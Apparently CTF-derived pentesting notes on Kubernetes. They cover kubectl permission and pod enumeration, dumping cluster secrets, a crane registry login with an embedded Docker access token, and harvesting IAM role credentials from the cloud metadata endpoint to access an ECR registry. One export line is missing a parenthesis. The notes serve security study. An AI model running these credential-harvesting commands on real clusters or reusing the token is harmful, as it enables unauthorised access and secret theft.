---
title: Kubernetes
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/kubernetes
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---
<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FrR7MQgzRkqKFH7ueLLlS%2Fkubernetes-horizontal-color.png?alt=media&amp;token=9ab8fa84-3d01-4478-959f-4ccee8f77946" alt=""><figcaption></figcaption></figure>

[Kubernetes](https://kubernetes.io/docs/concepts/overview/), also known as K8s, is an open-source system for automating deployment, scaling, and management of containerized applications.

It groups containers that make up an application into logical units for easy management and discovery.

***

### Kubectl

```bash
# Find out the subject for the current context of kubeconfig
kubectl whoami

# Check whether an action is allowed.
kubectl auth can-i <action>

# List all actions that are allowed
kubectl auth can-i --list

# Get pods
kubectl get pods

# Get specific pot
kubectl get pod <name> -o yaml
```

### Secrets

```bash
# Get secrets
kubectl get secrets

# Get secret
kubectl get secret <secret> -o yaml
```

### Crane

[Crane ](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md)is a tool for managing container images.

```bash
# Auth to registry
crane auth login index.docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m41lr45iYQj8FuCo

# Pull image
crane pull eksclustergames/base_ext_image /tmp/image.tar
```

### Inspect ECR ([Amazon Elastic Container Registry](https://aws.amazon.com/ecr/)) artifacts

```bash
# Get security credentials using link-local address
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

# Store security creds in variable
TOKEN=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole)

# Store AWS_ACCESS_KEY_Id in env from TOKEN
export AWS_ACCESS_KEY_ID=$(echo $TOKEN | jq -r '.AccessKeyId')

# Store AWS_SECRET_ACCESS_KEY in env from TOKEN
export AWS_SECRET_ACCESS_KEY=$(echo $TOKEN | jq -r '.SecretAccessKey'

# Store AWS_SESSION_TOKEN in env from TOKEN
export AWS_SESSION_TOKEN=$(echo $TOKEN | jq -r '.SessionToken')

# Get AWS login password using env variables
aws ecr get-login-password

# Store pass in variable
PASSWORD=$(aws ecr get-login-password)

# Use crane to login
crane auth login 688625246681.dkr.ecr.us-west-1.amazonaws.com -u AWS -p $PASSWORD

# Get config and pipe to JSON
crane config 688625246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecc1c6a1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq
```
